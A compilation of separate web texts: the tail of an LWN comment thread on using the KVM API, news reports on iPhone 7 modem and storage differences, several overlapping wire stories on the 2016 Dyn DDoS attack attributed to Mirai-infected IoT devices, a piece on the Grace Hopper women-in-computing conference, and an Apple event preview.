on the host showed that for each stat() in the guest, the host was doing a stat() on each directory component. So a stat() of a complete directory tree went O(N^2) on the directory depth. Now, I get that it's probably a configuration issue since it clearly wasn't caching anything, but I found it really hard to find documentation about qemu that explained this behaviour. On top of that I'm managing them via libvirt, so even if I find a command-line option to deal with something, if libvirt doesn't support it I'm still SOL. Overall, it hasn't been a great experience, next time I'll probably do what other people do, use VirtualBox or VMWare. But back to the article, it's a pretty nice interface actually. Hopefully I'll find some reason to use it sometime :) Using the KVM API Posted Oct 8, 2015 16:48 UTC (Thu) by LightDot (guest, #73140) [Link] You can pass raw qemu command line in the libvirt XML. This is an equivalent of '-vnc :30,tls -k fr -no-fd-bootchk': <domain type='kvm' xmlns:qemu='http://libvirt.org/schemas/domain/qemu/1.0'> ... <qemu:commandline> <qemu:arg value='-vnc'/> <qemu:arg value=':30,tls'/> <qemu:arg value='-k'/> <qemu:arg value='fr'/> <qemu:arg value='-no-fd-bootchk'/> </qemu:commandline> </domain> The VNC option doesn't need to be presented as a command line, I just left it as an example.

Can you explain your question better? Who is the subject? Using the KVM API Posted Sep 30, 2015 23:04 UTC (Wed) by josh (subscriber, #17465) [Link] Incidentally, with your background in qemu and kvm, perhaps you could explain (or point to documentation explaining) the purpose of KVM_SET_TSS_ADDR and KVM_SET_IDENTITY_MAP_ADDR, and what cases need them? A simple VM works without them, but the documentation lists them both as required for x86 VM setup. Using the KVM API Posted Oct 1, 2015 8:21 UTC (Thu) by pbonzini (subscriber, #60935) [Link] They are needed for unrestricted_guest=0. Remember that, in that case, the VM always runs in protected mode and with paging enabled. In order to emulate real mode you put the guest in a vm86 task, so you need some place for a TSS and for a page table, and they must be in guest RAM because the guest's TR and CR3 points to it. They are invisible to the guest, because the STR and MOV-from-CR instructions are invalid in vm86 mode, but it must be there. If you don't call KVM_SET_TSS_ADDR you actually get a complaint in dmesg, and the TR stays at 0. I am not really sure what kind of bad things can happen with unrestricted_guest=0, probably you just get a VM Entry failure. The TSS takes 3 pages of memory. An interesting point is that you actually don't need to set the TR selector to a valid value (as you would do when running in "normal" vm86 mode), you can simply set the base and limit registers that are hidden in the processor, and generally inaccessible except through VMREAD/VMWRITE or system management mode. So KVM needs to set up a TSS but not a GDT. For paging, instead, 1 page is enough because we have only 4GB of memory to address. KVM disables CR4.PAE (page address extensions, aka 8-byte entries in each page directory or page table) and enables CR4.PSE (page size extensions, aka 4MB huge pages support with 4-byte page directory entries). One page then fits 1024 4-byte page directory entries, each for a 4MB huge pages, totaling exactly 4GB. Here if you don't set it the page table is at address 0xFFFBC000. QEMU changes it to 0xFEFFC000 so that the BIOS can be up to 16MB in size (the default only allows 256k between 0xFFFC0000 and 0xFFFFFFFF). The different handling, where only the page table has a default, is unfortunate, but so goes life...

While I saw the mention of that message in a few places, I don't actually get that message at any point. Presumably that only happens with unrestricted_guest=0?

Using the KVM API Posted Sep 29, 2015 19:16 UTC (Tue) by Cyberax (✭ supporter ✭, #52523) [Link] Wow! This API is actually easy and straightforward. Far, far easier than I'd expect from a system emulator. Using the KVM API Posted Sep 29, 2015 20:17 UTC (Tue) by drag (subscriber, #31333) [Link] Well if you look at what KVM does... all it ultimately does is allow you to execute ring0 code in ring2 on a x86 cpu. That way you don't have to modify the OS kernel to be able to execute it as a application. The alternative is to do what Xen did with Linux and patch it so that you can run the Linux kernel more like a regular application. Previously you had kernel mode and then you had usermode ways to execute code. Now you have a third way, the kvm way. There isn't much to emulate because it's not using emulation at all. It's just executing the code directly on your processor. The only really magic/complicated stuff that happens is to deal with memory addressing for the guest OS. Qemu does all the heavy lifting as far as 'system emulator' goes. Using the KVM API Posted Oct 1, 2015 0:22 UTC (Thu) by rahvin (subscriber, #16953) [Link] If you think about it, this is probably the very reason most of the KVM internals were already in the Linux Kernel when Xen and VmWare were arguing over the "standard" for the changes to the Linux Kernel they needed. It pretty obvious that this is the reason why to me. The changes are straightforward and simple. novm / kvmtool still alive?

Posted Oct 1, 2015 15:58 UTC (Thu) by josh (subscriber, #17465) [Link] > Last novm commit on github is 8 months old. True, novm appears somewhat stale, and I don't know if it sees active use. I mentioned it only as an example of an interesting project using KVM directly. > kvmtool that I found doesn't seem all that active either. It does most of what people using it want; it tend to grow new features as the KVM API does, grow new architectures when KVM supports them and someone wants to run kvmtool on them, and occasionally gain new drivers. I'd recommend trying kvmtool in its current state; it works quite well. novm / kvmtool still alive?

ARM added support for virtualization as an extension to ARMv7 architecture which later become part of ARMv8. Hardware support for virtualization on ARM is a achieved by: 1. introducing a new CPU privellege level for hypervisors called Hyp or Excpetion Level 2 (EL2). 2. Adding 2nd stage translation to the CPUs MMU 3. Adding support for virtual interrupts to the generic interrupt controller (GIC) 4, Adding support for virtual timer in the ARM architected timer there is a great article from Christopher Dall et all explaining how KVM was ported to ARM http://systems.cs.columbia.edu/files/wpid-asplos2014-kvm.pdf Using the KVM API with ARM?

Using the KVM API Posted Oct 4, 2016 16:51 UTC (Tue) by sahil (guest, #100553) [Link] I initially thought that this number '0x3f8' has a special significance for kvm api, as in, kvm would recognize this address as an memory mapped I/O or some other special address. The truth is that KVM exits due to 'out' opcode, and not because of the address. In the host, we then check the 1st operand of this 'out' opcode matches the value we gave, '0x3f8' in this case. We can have any other number (as long as it is 1 byte long) as operand, thus even 'out 0x4000, al', or 'out 0x0000, al' (intel syntax) would work just fine. Copyright © 2015, Eklektix, Inc.

It has to do with the speed of the phones. Some iPhone 7s were built with a Qualcomm modem, while others have an Intel modem. Research firm Cellular Insights recently found Qualcomm modems work 30 percent better than their counterparts. SEE MORE: Tim Cook Sees iPhones Everywhere, Even In A 17th-Century Painting And if you want to make sure you get the faster phone, you'd have to consider switching phone carriers. Verizon, Sprint and SIM-free models have the Qualcomm modem. Phones from AT&T, T-Mobile and Telstra have the Intel hardware. Before you start feeling cheated, you should probably know that this isn't a first for Apple. You might remember not too long ago that one iPhone model had a variation in its processors. Plus, the difference in speeds in the iPhone 7 isn't that noticeable. Cellular Insights found the Intel modems were roughly the same speed as the iPhone 6S.

The White House called the disruption malicious and a hacker group claimed responsibility, though its assertion couldn't be verified. Manchester, New Hampshire-based Dyn Inc. said its data centers were hit by three waves of distributed denial-of-service attacks, which overwhelm targeted machines with junk data traffic. The attacks, shifting geographically, had knock-on effects for users trying to access popular websites across the U.S. even in Europe. "The complexity of the attacks is what is making it so difficult for us," said Kyle York, the company's chief strategy officer. "What they are actually doing is moving around the world with each attack." He said an East Coast data center was hit first; attacks on an offshore target followed later. The data flood came from tens of millions of different Internet-connected machines — including increasingly popular but highly insecure household devices such as web-connected cameras. It was an onslaught whose global shifts suggested a sophisticated attacker, though Dyn said it had neither suspect nor motive. BROAD EFFECTS The level of disruption was difficult to gauge, but Dyn serves some of the biggest names on the web, providing the domain name services that translate the numerical internet addresses into human-readable destinations such as "twitter.com." Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. "It doesn't matter that the store is fully open or operational if you have no idea how to get there," he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. "We've been monitoring Dyn for years and this is by far the worst outage event that we've observed," said Read. Dyn provides services to some 6 percent of America's Fortune 500 companies, he said. A full list of affected companies wasn't immediately available but Twitter, Netflix, PayPal and the coder hangout Github said they experienced problems. HACKERS CLAIM RESPONSIBILITY Members of a shadowy collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected "zombie" computers called botnets that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. "We didn't do this to attract federal agents, only test power," two collective members who identified themselves as "Prophet" and "Zain" told an AP reporter via Twitter direct message exchange. They said more than 10 member participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPN.com in September and the BBC on Dec. 31. The attack on the BBC marshaled half the computing power of Friday's onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorkdHacking Twitter account. They claim 20 are in Russia and 10 in China. "Prophet" said he is in India. "Zain" said he is in China. The two claimed to their actions were "good," presumably because they highlighted internet security problems. Another collective member the AP previously communicated with via direct message called himself "Ownz" and identified himself as a 19-year-old in London. He told the AP that the group — or at least he — sought only to expose security vulnerabilities. During the attack on the ESPN site, "Ownz" was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. "We will make one demand actually. Secure your website and get better servers, otherwise be attacked again," he said. For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption.

Local Submit Event Search « Cubs Looking for Magic Season to Continue | Main | More Children Being Hospitalized with Headaches » Saturday Oct222016 Report: 32gb iPhone 7 Slower than Other Models Saturday, October 22, 2016 at 10:09AM Not all iPhone 7s are born equally, according to new tests, which appear to show the cheapest, 32GB versions are significantly slower than the more expensive 128 or 256GB versions and that some have much poorer 4G reception. Testing by both GSMArena and Unbox Therapy found that the speed of the storage within the 32GB iPhone 7 is significantly slower than that in the more expensive 128GB iPhone 7. Reading data from the storage of the 32GB version of the iPhone 7 was 200Mbps slower than the 12GB version, 656Mbps and 856Mbps respectively. The difference in read speed over 600Mbps is unlikely to be noticeable in day-to-day usage. However, writing to the storage – saving data including photos, videos, music, apps or any other type of file – was found to be significantly slower on the 32GB iPhone. The 128GB iPhone 7 wrote to memory at 341Mbps, but the 32GB iPhone 7 was over eight times slower at just 42Mbps. GSMArena found similar results in its testing of the iPhone 7, with a 32GB iPhone 7 Plus reaching write speeds of only 39.6Mbps compared with a 128GB iPhone 7 writing at speeds of 308Mbps. Meanwhile, testing of different versions of the iPhone 7 Plus have also apparently revealed discrepancies in their cellular performances. According to New York-based Cellular Insights, which conducted tests using networking equipment, the iPhone 7 Plus smartphones with model numbers A1778 and A1784, including those available in the UK and Europe, performed noticeably poorer than those with model numbers A1660 and A1661, including those available in the US. A1778 and A1784 iPhone 7 Plus smartphones have an Intel modem chip that connects them to the 4G network, while the A1660 and A1661 models use a modem supplied by Qualcomm, a common supplier of modems and processors to many Android smartphones, including the new Google Pixel. The Intel iPhone 7 Plus models showed at least 30% worse network performance, and in some cases as poor as 75% worse, than the Qualcomm iPhone 7 Plus models. This performance gap means that the Intel iPhone 7 Plus models will have poorer 4G reception than the Qualcomm versions and slower download and upload speeds. Milan Milanović from Cellular Insights said: “In all tests, the iPhone 7 Plus with the Qualcomm modem had a significant performance edge over the iPhone 7 Plus with the Intel modem. We are not sure what was the main reason behind Apple’s decision to source two different modem suppliers for the newest iPhone.” In Cellular Insights further testing, it showed that the Intel iPhone 7 Plus models had worse reception than the iPhone 6S in the majority of signal conditions. Most of the time users blame mobile phone operators when the signal drops out on their smartphone or data speeds are slow, but the testing indicates that depending on smartphone model, it might not always be the fault of the network provider. Apple did not reply for request for comment.

A massive cyberattack that compromised major websites on Friday was waged through hundreds of thousands of web-connected devices – the so-called Internet of Things. The type of attack, known as DDoS, crashes websites and services by overwhelming them with large amounts of traffic. Such attacks are usually mounted using computers that were previously infected with a virus. This time, however, the hackers extended the method to a wide variety of devices connected to the internet, including security cameras, webcams, DVRs and even baby monitors. More on Internet of Things: Meet the Israeli startups connecting the internet to everything | Intel creating Internet of Things’ lab in Haifa A Politico report said that sources in the U.S. claiming to be affiliated with the hacking collective Anonymous and with a group named New World claimed the attack. They said it was revenge for cutting Wikileaks founder Julian Assange's internet. Ecuador on Tuesday acknowledged it had restricted internet access for Assange, who has lived in its London embassy since mid-2012, over the publication of hacked emails linked to U.S. Democratic presidential candidate Hillary Clinton. However, the report said experts doubt the group was in fact behind the attack, saying in the past both groups  falsely claims responsibility for cyber attacks. Smart appliances on display at an electronics show. They may look like refrigerators to you, but for hackers they're cyberattack weapons.Chris Ratcliffe, Bloomberg Wikileaks responded with a tweet requesting their supports to cease the attack. "Mr. Assange is still alive and WikiLeaks is still publishing. We ask supporters to stop taking down the US internet. You proved your point," the tweet said. In 2010, banks and other firms cut ties with Wikileaks after it published the leaked Bradley Manning files and a 2007 video of a U.S. apache helicopter mistakenly shooting several Iraqi civilians. Anonymous hackers attacked the firms in response, crippling their online operations. Since then, many hacking groups across the world, and also in Israel, identified as part of Anonymous. The attacks struck Twitter, Paypal, Netflix and other customers of an infrastructure company in New Hampshire called Dyn, which acts as a switchboard for internet traffic. skip - How It Works: Internet of Things. According to Flashpoint, a cybersecurity firm, the hackers used malware called Mirai, which takes over unsuspecting people's web-connected devices and turns them into a network that can be used in a cyberattack. The Internet of Things is a fertile ground for hackers, says Ziv Gadot, CEO of Red Button, a cybersecurity firm that specializes in DDoS attacks. These devices contain computers and are connected to the internet, but their security is still "in diapers," he says.  "Anything that may look like a tea kettle, a refrigerator or a security camera to you, is seen by hackers as a computer that can be connected to a network of tens of thousands or hundreds of thousands of other computers ready for zero hour," Gadot explains. "And when the time comes, they generate an overload of requests beyond what even a strong service like Dyn can handle." According to Dyn, the cyberattack consisted of three heavy assaults from millions of unique IP addresses, making it one of the largest attacks ever seen. Each part of the attack came from different sources, which made it difficult to block.  Attacking a large domain name service provider like Dyn can create massive disruptions because such firms are responsible for forwarding large volumes of internet traffic. Friday's outages were intermittent and varied by geography. Users complained they could not reach dozens of internet destinations including Mashable, CNN, the New York Times, the Wall Street Journal, Yelp and some businesses hosted by Amazon.com Inc. Spotify, Airbnb, and Reddit were down as well. The outages began in the eastern United States and then spread to other parts of the country and Europe. Dyn said it had resolved one morning attack on Friday, which disrupted operations for about two hours, but disclosed a second a few hours later that was causing further disruptions. By evening it was fighting a third. The Mirai malware code was recently leaked online, which made it easier for hackers to use and even more difficult for cybersecurity firms and agencies to deal with. Following the leak, the U.S. Department of Homeland Security issued a warning about attacks from the Internet of Things last week.  The disruptions come at a time of unprecedented fears about the cyber threat in the United States, where hackers have breached political organizations and election agencies.

Women in tech: Why the small victories matter 0 Share: Tech Industry by Erin Carson October 22, 2016 5:00 AM PDT @erincarson Up Next Does the internet have a fake-news problem? The Grace Hopper Celebration of Women in Computing aims to create a better culture in the industry for the next generation of female geeks. Photo by Brent Lewis/Getty Images If you're wondering where all the women in tech are, this week the easy answer was Houston, Texas -- at the Grace Hopper Celebration of Women in Computing. It's an annual conference hosted by the Anita Borg Institute, an organization focused on the advancement of women in technology. The event is named for Grace Hopper, a rear admiral in the US Navy who helped create the COBOL programming language, among other achievements. This year, 15,000 attendees, mostly women, with about 1,000 men thrown in, congregated for three days of speakers, workshops and as much branded swag as they could stuff in a tote bag. And, hopefully, some job opportunities. In the past, the event has gotten attention for attracting big names and, occasionally, trouble. Two years ago, Microsoft CEO Satya Nadella incurred much ire for telling women they should trust the system instead of asking for raises. Last year, YouTube CEO Susan Wojcicki talked about sending her disgruntled daughter to an all-girls coding camp. This year, the word on everyone's lips is progress. In just one year, the conference has grown by about 3,000 attendees. Side chatter revolves around how refreshing it is to be around so many other women. And when a speaker like Intel CEO Brian Krzanich mentions something like men taking credit for women's ideas in meetings, the crowd chuckles. They know exactly what he's talking about. The way out of this problem is to not lose heart, a message the conference continually reinforces. "If we don't celebrate the wins, we lose sight of the bigger picture," said Reshma Saujani, founder of nonprofit education program Girls Who Code. "Celebration" might seem like an offbeat way to put it. A conference is a conference, after all, but considering the current climate in tech, women in the industry might need a positive boost more than ever. A report came out Thursday from Girls Who Code and consulting firm Accenture projecting that women's share of tech jobs in the US could fall, amounting to only one in five by 2025. Maybe it shouldn't come as a surprise. In 1984, 37 percent of computer science majors were women. That number steadily dropped and now stands at about 18 percent. As much as the industry is finally talking about the dearth of women in tech, no one is really considering that the situation could get worse. The report also found that the salary gap between men and women in the US widened even further, from $8,540 in 2011 to $12,661 in 2015. 'Sisterhood matters' The news is seldom good. Published diversity and inclusion reports show that tech companies struggle to get their technical workforces up to even 30 percent women. The obstacles multiply, and even the youngest attendees seem to know it. Discouragement is a bear. So the Grace Hopper conference tries to keep the good vibes flowing. "We know sisterhood matters in sparking and sustaining girls' interest in computing as they move through the pipeline," said Saujani, a Grace Hopper regular, who appeared on a panel last year with Chelsea Clinton, Twitter CEO Jack Dorsey and Facebook's director of global diversity, Maxine Williams. A few minutes before IBM CEO Ginni Rometty took the stage for her keynote speech on Wednesday, a college student named Alyssia Jovellanos accepted the Student of Vision ABIE Award from the Anita Borg Institute and talked to a packed arena about how important it is to have role models. Cisco sponsored a disco. The Microsoft brigade wore blindingly blue T-shirts. Attendees struck up conversations without reservation. A sophomore from the College of William and Mary in Virginia told me she'd made up her mind to get a master's degree -- partly because of the conversations she's had with people here, partly to make up for the fact she'll probably earn less because, you know, she's a woman. A technical conference Anita Borg, who passed away in 2003, and Anita Borg Institute CEO Telle Whitney started GHC in 1994, with a whopping 500 attendees. "There was a lot of teeth gnashing about the lack of women in the sciences," Whitney said of the early days of the conference. Over time, the conference has sought to balance the more on-the-nose sessions about being a woman in tech with technical sessions. So Grace Hopper was a place to get advice on how to deal with unconscious biases in the workplace or to attend a session on computer simulations for drug discovery, or data management or cybersecurity. Last year I wandered into a session on virtual-reality analytics. My liberal arts education and I slunk out after about four PowerPoint slides of algorithms. But think back to that stat on the percentage of women computer science majors out there. These sessions might be some of the only educational spaces these women will enter where they're not one of only a few women in the room. The future of women in tech GHC might be only once a year, but Whitney hopes the effects take hold beyond that. After all, the conversation around diversity in tech is one about culture change. There's a reason why speakers like Lyndsay Pearson, from video game maker Electronic Arts, preach topics like building inclusion into gaming. The bones of the industry have to be reset. At Grace Hopper, that reset starts with an expo floor packed with recruiters from companies looking to hire attendees. The booths are bright, the smiles are big, young women in skirts and flats walk around with resumes, trying to imagine themselves working anywhere from Bank of America to Airbnb -- and they have a fair shot at doing so. Even Walmart has a booth. Saujani is one of many who believes life will be better with the power of tech on women's side. "The idea that they can use technology to further their interests opens up so many more pathways for keeping girls engaged in the long run," she said. The conference sends a loud message that there are women in this industry and that they can, despite it all, find success. Sometimes that starts with a conversation at lunch, bonding over a slice of pizza, or by getting to ask a notable figure how she deals with imposter syndrome, the feeling that others will realize you're not good enough to be where you are. To a large degree, it's also about being able to stand in a room, do a 360-degree turn and see a few thousand other women in tech.

(AAPL) Will Kill Why Tesla Motors Inc (TSLA) Ended the Free Supercharger Ride Apple Inc.’s (AAPL) New MacBook Pro Is Actually a Monster Hit Recent Posts: Apple Inc. (AAPL) Could Launch Apple Glasses by 2018 The Next Thing Apple Inc. (AAPL) Will Kill Why Tesla Motors Inc (TSLA) Ended the Free Supercharger Ride View All Posts As had been expected, Apple Inc. (NASDAQ:AAPL) finally sent out media invitations to a special event, to be held on Oct. 27. What will AAPL announce? We’re pretty sure a new MacBook Pro is going to be unveiled. There’s likely to be more Apple gear making an appearance, too, and at least one popular Apple product is not long for this world. Source: Apple Whether because of the distraction of new products like the iPhone 7, or a lack of key components like new mobile CPUs, Apple has let its Mac hardware languish. And sales have suffered as a result. Apple’s late-October event seems likely to be focused on playing catch up, and finally releasing new Mac models. New MacBook Pro This is as close to a “given” as you get with an Apple event. The MacBook Pro is a key product aimed at professional users and it hasn’t been updated in a year and a half. The internet has been buzzing with spy shots showing an intriguing OLED strip of function keys. Also expect USB-C ports in place of the existing full-sized USB and Thunderbolt ports, and AAPL will likely turn to USB-C for power as well. New mobile Skylake CPUs from Intel Corporation (NASDAQ:INTC) are ready and should be powering the laptop. The new MacBook Pro is expected to be thinner, lighter and more powerful than ever. MacBook Air Once the star of AAPL’s notebook lineup, the MacBook Air is in serious need of an overhaul. Its display dates to 2012 and it last saw a meaningful upgrade in 2015. 7 Tech Stocks That Will Ride Healthcare to Riches Rumors are flying that Apple is going to discontinue the 11-inch MacBook Air. If the company keeps the 13-inch MBA as the new entry level Mac laptop, it may get a CPU upgrade and possibly make the switch to USB-C. But it seems doubtful Apple will bother to upgrade that screen. iMac Apple’s sleek all-in-one desktop computer is another strong candidate to be featured. It’s been a year since the last upgrade. The iMac could be in line to receive a new CPU, new graphic card options and possibly some USB-C ports. Apple is big on USB-C, after all. With Microsoft Corporation (NASDAQ:MSFT) apparently poised to unleash its hardware design chops with a Surface PC aimed squarely at the iMac, AAPL would be foolish to leave this Mac to sit with its outdated specs for any longer. Long Shots While a new MacBook Pro is pretty much a shoe-in for the Apple Event, there are also some long shots. AAPL could unveil a new Mac Pro and/or Mac Mini. It has literally gone for years without upgrading these machines. Even throwing in a current generation Intel CPU would go a long way toward preserving some sense of relevance for these Macs. Another long shot is a new 5K monitor to replace Apple’s only monitor (the Thunderbolt Display), which was discontinued earlier this year. AAPL has reportedly been in talks with LG about producing a new 5K display that would bear the Apple logo. Non-Mac Hardware While new Mac announcements are expected to headline, a new Apple TV is a possibility at the Oct. 27 event. The current streamer is a year old, and the entry-level third generation model AAPL kept around has been dropped. It seems unlikely Apple would go into the holiday season against competition like Alphabet Inc’s (NASDAQ:GOOG, NASDAQ:GOOGL) new $69, 4K Chromecast Ultra with the current Apple TV — which starts at $149 and maxes out at 1080p. What to Expect From Microsoft’s October Event Other non-Mac long shots include a Siri-powered competitor to the Amazon.com, Inc. (NASDAQ:AMZN) Echo and Google Home connected speakers, and a revised Apple Wi-Fi router (the Airport Extreme is now over three years old). Circle back on Oct. 27 to find out which of our predictions turn out to be correct. We’ll have a full recap of the Apple event, including the new MacBook Pro and any other announcements. As of this writing, Brad Moon did not hold a position in any of the aforementioned securities. More From InvestorPlace: It’s Time for New Macs — Apple Inc.

The White House called the disruption malicious and a hacker group claimed responsibility, though its assertion couldn’t be verified. Play Video Saturday Who is behind cyberattack on U.S. websites? James Norton, founder and president of Play-Action Strategies, a cybersecurity firm, joins "CBS This Morning: Saturday" to discuss the New World ... Manchester, New Hampshire-based Dyn Inc. said its data centers were hit by three waves of distributed denial-of-service attacks, which overwhelm targeted machines with junk data traffic. The attacks, shifting geographically, had knock-on effects for users trying to access popular websites across the U.S. even in Europe. “The complexity of the attacks is what is making it so difficult for us,” said Kyle York, the company’s chief strategy officer. “What they are actually doing is moving around the world with each attack.” He said an East Coast data center was hit first; attacks on an offshore target followed later. CBS News homeland security consultant Fran Townsend pointed to Russia as a possible instigator. “Is this sort of a brushback pitch from the Russians sending us a message that we should be pretty careful about engaging in this sort of cyberactivity with them because they are very capable,” she said. The FBI and the Department of Homeland Security told CBS News they were investigating “all potential causes,” but they have not gone as far as to say that this was a state-sponsored attack. The data flood came from tens of millions of different Internet-connected machines - including increasingly popular but highly insecure household devices such as web-connected cameras. It was an onslaught whose global shifts suggested a sophisticated attacker, though Dyn said it had neither suspect nor motive. The level of disruption was difficult to gauge, but Dyn serves some of the biggest names on the web, providing the domain name services that translate the numerical internet addresses into human-readable destinations such as “twitter.com.” Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. “It doesn’t matter that the store is fully open or operational if you have no idea how to get there,” he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. “We’ve been monitoring Dyn for years and this is by far the worst outage event that we’ve observed,” said Read. Dyn provides services to some 6 percent of America’s Fortune 500 companies, he said. A full list of affected companies wasn’t immediately available but Twitter, Netflix, PayPal and the coder hangout Github said they experienced problems. Members of a shadowy collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected “zombie” computers called botnets that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. “We didn’t do this to attract federal agents, only test power,” two collective members who identified themselves as “Prophet” and “Zain” told an AP reporter via Twitter direct message exchange. They said more than 10 members participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they have received no claim of responsibility, but are working with law enforcement. The collective, NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPN.com in September and the BBC on Dec. 31. The attack on the BBC marshaled half the computing power of Friday’s onslaught. The collective has also claimed responsibility for cyberattacks against the Islamic State of Iraq and Syria, or ISIS. The two said about 30 people have access to the NewWorkdHacking Twitter account. They claim 20 are in Russia and 10 in China. “Prophet” said he is in India. “Zain” said he is in China. The two claimed to their actions were “good,” presumably because they highlighted internet security problems. Another collective member the AP previously communicated with via direct message called himself “Ownz” and identified himself as a 19-year-old in London. He told the AP that the group - or at least he - sought only to expose security vulnerabilities. During the attack on the ESPN site, “Ownz” was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. “We will make one demand actually. Secure your website and get better servers, otherwise be attacked again,” he said. For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. “I think you can see how fragile the internet network actually is,” he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the internet - closed-circuit video cameras, digital video recorders and even thermostats - that were infected with malware. “The Internet of Things sort of ran way ahead of how the Internet was architected,” Dyn’s York said on a call with reporters. He said there are between 10-15 billion such devices online. Dyn first became aware of an attack around 7 a.m. local time, focused on data centers on the East Coast of the U.S. Services were restored about two hours later. But then attackers shifted to offshore data centers, and problems continue. “It is a very smart attack. As we start to mitigate they react and start to throw something that’s over the top,” York said on a call with reporters. The second attack broadened its net, affecting the U.S. West Coast. “Prophet” of New World Hackers said hacktivists of the broad, more amorphous Anonymous collective piled on in the third wave on Friday afternoon. “We’ve stopped all our attacks,” he said at midafternoon. The U.S. Department of Homeland Security was monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption. Security experts have recently expressed concern over increasing power of denial-of-service attacks following high-profile electronic assaults against investigative journalist Brian Krebs and French internet service provider OVH. In a widely shared essay titled “Someone Is Learning How to Take Down the Internet,” respected security expert Bruce Schneier said last month that major internet infrastructure companies were seeing a series of worrying denial-of-service attacks. “Someone is extensively testing the core defensive capabilities of the companies that provide critical internet services,” he said. © 2016 CBS Interactive Inc.

The attack had knock-on effects for users trying to access popular websites from across America and even in Europe, affecting sites such as Twitter, Netflix and PayPal. Broad effects The level of disruption was difficult to gauge, but Dyn provides internet traffic management and optimization services to some of the biggest names on the web, including Twitter, Netflix and Visa. Critically, Dyn provides domain name services, which translate the human-readable addresses such as "twitter.com" into an online route for browsers and applications. Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. "It doesn't matter that the store is fully open or operational if you have no idea how to get there," he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. A second attack later in the day caused disruption to the East and West Coasts as well as impacting some users in Europe. "It's been pretty busy for those guys," Read said. "We've been monitoring Dyn for years and this is by far the worst outage event that we've observed." Read said Dyn provides services to some 6 percent of America's Fortune 500 companies. "It impacted quite a few users," he said of the morning's attack. A full list of affected companies wasn't immediately available, but Twitter, Netflix, PayPal and the coder hangout Github said they briefly experienced problems earlier Friday. Hackers responsible Members of a shadowy hacker collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected "zombie" computers that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. "We didn't do this to attract federal agents, only test power," two collective members who identified themselves as "Prophet" and "Zain" told an AP reporter via Twitter direct message exchange. They said more than 10 members participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they did not know who was behind the attacks or if they were orchestrated by a state-backed group or online activists or pranksters. They said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPNFantasySports.com in September and the BBC on Dec. 31. The attack on the BBC marshalled half the computing power of Friday's onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorkd Hacking Twitter account. They said 20 are in Russia and 10 in China. "Prophet" said he is in India. "Zain" said he is in China. The two claimed to be taking "good actions." Another collective member the AP previously communicated with via direct message called himself "Ownz" and identified himself as a 19-year-old in London. He told the AP that the group - or at least he - sought through hacking only to expose security vulnerabilities. During the attack on the ESPN site, "Ownz" was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. "We will make one demand actually.

The vulnerable internet For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. "I think you can see how fragile the internet network actually is," he said. Dyn said in a series of statements that it first became aware of the attack around 7 a.m. local time and that services were restored about two hours later. A little more than two hours later, the company said it was working to mitigate another attack. A Dyn spokesman didn't respond to questions seeking further information about the online onslaught. The U.S. Department of Homeland Security is monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption. Security experts have recently expressed concern over increasing power of denial-of-service attacks following high-profile electronic assaults against investigative journalist Brian Krebs and French internet service provider OVH. In a widely shared essay titled "Someone Is Learning How to Take Down the Internet," respected security expert Bruce Schneier said last month that major internet infrastructure companies were seeing a series of worrying denial-of-service attacks. "Someone is extensively testing the core defensive capabilities of the companies that provide critical internet services," he said. Top Jobs Contemporary Chrysler • Jeep • Dodge Ram is hiring!!

